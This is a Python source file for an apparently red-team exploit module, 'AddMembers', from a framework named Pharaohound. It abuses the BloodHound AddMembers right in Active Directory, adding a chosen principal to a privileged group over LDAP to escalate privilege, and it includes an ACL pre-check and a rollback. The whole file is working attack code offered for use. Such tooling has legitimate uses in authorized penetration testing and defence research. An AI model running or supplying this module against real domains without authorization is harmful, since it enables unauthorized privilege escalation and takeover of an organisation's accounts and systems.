"""
Module: AddMembers
==================
Exploit the AddMembers BloodHound edge. When a principal holds the
right to add members to a target group, this module adds a controlled
principal to that group for privilege escalation.

BloodHound Edge: AddMembers
Attack Vector:   Group membership manipulation (add arbitrary member)
Severity:        HIGH
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.add_members")


class AddMembers(ExploitModule):
    """
    Add an arbitrary principal to a target group when the current user
    holds the AddMembers right on that group object.

    Unlike MemberOf (which focuses on checking/using existing membership),
    this module explicitly exercises the AddMembers ACE to inject a
    member into a privileged group.
    """

    name: str            = "AddMembers"
    description: str     = (
        "Leverage the AddMembers right to add an arbitrary principal "
        "to a target group. Used when ACL analysis shows the current "
        "principal can write to the 'member' attribute of a group."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "AddMembers"
    severity: Severity   = Severity.HIGH
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addmembers",
        "https://attack.mappings.mitre.org/technique/T1098/003/",
        "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7cda533e-d7b4-4ad8-b4c7-7b0b419d3c98",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target_group",
            display_name="Target Group",
            description="DN or SAM name of the group to add a member to.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="member_to_add",
            display_name="Member to Add",
            description="DN or SAM name of the principal to add. Defaults to current user.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="verify_acl",
            display_name="Verify ACL First",
            description="Check that the current user actually has AddMembers right before attempting.",
            required=False,
            default=True,
            value_type=bool,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _resolve_dn(self, name: str, search_base: str) -> Optional[str]:
        """Resolve a SAM name or CN to a full DN via LDAP search."""
        if not name:
            return None
        if "," in name and "=" in name:
            return name
        search_filter = f"(|(sAMAccountName={name})(cn={name}))"
        try:
            self.connection.search(search_base, search_filter, attributes=["distinguishedName"])
            if self.connection.entries:
                return str(self.connection.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("DN resolution failed for '%s': %s", name, exc)
        return None

    def _get_search_base(self, domain: Optional[str]) -> str:
        """Determine LDAP search base from domain or connection."""
        if domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _get_bound_user_dn(self) -> Optional[str]:
        """Get the DN of the currently authenticated user."""
        conn = self.connection
        try:
            if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                return conn.extend.standard.who_am_i()
            elif hasattr(conn, "who_am_i"):
                return conn.who_am_i()
        except Exception as exc:
            self.logger.debug("who_am_i failed: %s", exc)
        return None

    def _check_add_members_acl(
        self, group_dn: str, user_dn: str
    ) -> Tuple[bool, str]:
        """
        Read the security descriptor of the target group and verify that
        the current user holds the right to add members (ADS_RIGHT_DS_WRITE_PROP
        on the 'member' attribute, or ADS_RIGHT_DS_SELF_MEMBERSHIP if applicable).

        This is an advisory check — the actual LDAP modify will also
        fail server-side if the right is absent.
        """
        try:
            self.connection.search(
                group_dn,
                "(objectClass=*)",
                attributes=["objectSid", "nTSecurityDescriptor"],
                controls=[("1.2.840.113556.1.4.801", True, None)],  # SD_FLAGS
            )
            if not self.connection.entries:
                return False, "Group not found."

            sd_raw = self.connection.entries[0].nTSecurityDescriptor.raw_values
            if not sd_raw:
                return True, "No SD returned; skipping ACL check (will rely on server enforcement)."

            # Parse the security descriptor to check for Write Property on 'member'
            from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
            sd = SR_SECURITY_DESCRIPTOR(data=sd_raw[0])

            # The right to add to 'member' is ADS_RIGHT_DS_WRITE_PROP (0x10)
            # applied to the 'member' attribute GUID (bf9679c0-0de6-11d0-a285-00aa003049e2)
            MEMBER_ATTR_GUID = "bf9679c0-0de6-11d0-a285-00aa003049e2"
            WRITE_PROP = 0x10  # ADS_RIGHT_DS_WRITE_PROP

            if sd['Dacl'] != b'':
                for ace in sd['Dacl'].aces:
                    # Check if the ACE applies to our user (by SID)
                    # and grants write on the member attribute
                    if ace['TypeName'] in ("ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE"):
                        mask = ace['Ace']['Mask']['Mask']
                        if ace['TypeName'] == "ACCESS_ALLOWED_OBJECT_ACE":
                            import uuid
                            obj_guid = str(uuid.UUID(bytes_le=ace['Ace']['ObjectType'])) if (ace['Ace']['Flags'] & 1) else None
                            if (obj_guid and
                                obj_guid.lower() == MEMBER_ATTR_GUID.lower() and
                                mask & WRITE_PROP):
                                return True, "AddMembers right confirmed via object-specific ACE."
                        else:
                            # Generic ADS_RIGHT_DS_WRITE_PROP on the object
                            if mask & WRITE_PROP:
                                return True, "Generic write-property right found (may allow AddMembers)."

            return False, (
                "No AddMembers ACE found on the target group. "
                "The server may still allow the operation if inherited rights apply."
            )
        except ImportError:
            self.logger.warning("ldap3 SD parsing not available; skipping ACL check.")
            return True, "ACL check skipped (SD parser unavailable)."
        except Exception as exc:
            self.logger.warning("ACL check error: %s", exc)
            return True, f"ACL check inconclusive: {exc}"

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        target_group = self._opt("target_group", kwargs)
        if not target_group:
            return False, "Target group is required."

        domain = self._opt("domain", kwargs)
        search_base = self._get_search_base(domain)
        if not search_base:
            return False, "Cannot determine LDAP search base. Provide 'domain'."

        group_dn = self._resolve_dn(target_group, search_base)
        if not group_dn:
            return False, f"Target group '{target_group}' not found in LDAP."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        conn = self.connection
        target_group = self._opt("target_group", kwargs)
        member_to_add = self._opt("member_to_add", kwargs)
        domain = self._opt("domain", kwargs)
        verify_acl = self._opt("verify_acl", kwargs)

        search_base = self._get_search_base(domain)

        # Resolve target group DN
        group_dn = self._resolve_dn(target_group, search_base)
        if not group_dn:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target group '{target_group}'.",
            )

        # Resolve principal to add
        principal_dn = self._resolve_dn(member_to_add, search_base) if member_to_add else None
        if not principal_dn:
            principal_dn = self._get_bound_user_dn()
        if not principal_dn:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.ERROR,
                message="Cannot resolve principal to add and cannot determine bound user.",
            )

        self.logger.info(
            "[AddMembers] Adding '%s' -> '%s'", principal_dn, group_dn
        )

        # Optional ACL verification
        if verify_acl:
            user_dn = self._get_bound_user_dn() or ""
            acl_ok, acl_msg = self._check_add_members_acl(group_dn, user_dn)
            self.logger.info("[AddMembers] ACL check: %s", acl_msg)
            if not acl_ok:
                return ExploitOutput(
                    success=False,
                    result_type=ExploitResult.FAILED,
                    message=f"ACL check failed: {acl_msg}",
                )

        # Check if already a member
        try:
            conn.search(group_dn, "(objectClass=*)", attributes=["member"])
            if conn.entries and hasattr(conn.entries[0], "member"):
                existing = conn.entries[0].member.values or []
                if principal_dn in existing:
                    return ExploitOutput(
                        success=True,
                        result_type=ExploitResult.SKIPPED,
                        message=f"'{principal_dn}' is already a member of '{group_dn}'.",
                        data={"group_dn": group_dn, "principal_dn": principal_dn},
                    )
        except Exception:
            pass

        # Perform LDAP modify — ADD to 'member' attribute
        try:
            result = conn.modify(
                group_dn,
                {"member": [(ldap3.MODIFY_ADD, [principal_dn])]},
            )

            if result:
                self.logger.info("[AddMembers] SUCCESS — principal added to group.")
                return ExploitOutput(
                    success=True,
                    result_type=ExploitResult.SUCCESS,
                    message=f"Successfully added '{principal_dn}' to '{group_dn}'.",
                    data={
                        "group_dn": group_dn,
                        "principal_dn": principal_dn,
                        "action": "member_added",
                    },
                    rollback_data={
                        "group_dn": group_dn,
                        "principal_dn": principal_dn,
                        "operation": "remove_member",
                    },
                )
            else:
                err_desc = conn.result.get("description", "Unknown LDAP error")
                err_msg = conn.result.get("message", "")
                return ExploitOutput(
                    success=False,
                    result_type=ExploitResult.FAILED,
                    message=f"LDAP modify failed: {err_desc} — {err_msg}",
                    data={"ldap_result": conn.result},
                )

        except Exception as exc:
            return ExploitOutput(
                success=False,
                result_type=ExploitResult.ERROR,
                message=f"Exception during AddMembers: {exc}",
            )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #

    def rollback(self, **kwargs) -> ExploitOutput:
        group_dn = kwargs.get("group_dn")
        principal_dn = kwargs.get("principal_dn")
        if not group_dn or not principal_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Rollback needs 'group_dn' and 'principal_dn'.",
            )
        try:
            result = self.connection.modify(
                group_dn,
                {"member": [(ldap3.MODIFY_DELETE, [principal_dn])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Rolled back: removed '{principal_dn}' from '{group_dn}'.",
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Rollback failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Rollback exception: {exc}",
            )
